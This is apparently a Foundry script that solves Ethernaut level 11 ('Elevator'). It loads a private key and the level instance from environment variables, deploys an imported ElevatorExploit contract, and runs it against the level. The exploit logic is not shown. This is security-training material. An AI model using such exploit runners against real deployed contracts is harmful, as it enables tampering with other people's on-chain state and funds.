// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Elevator} from "src/11/Elevator.sol";
import {ElevatorExploit} from "src/11/ElevatorExploit.sol";


contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL11");  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
    Elevator level = Elevator(instance);  
    ElevatorExploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);

        exploit = new ElevatorExploit();
        exploit.run(level);
        
        vm.stopBroadcast();
    }
}
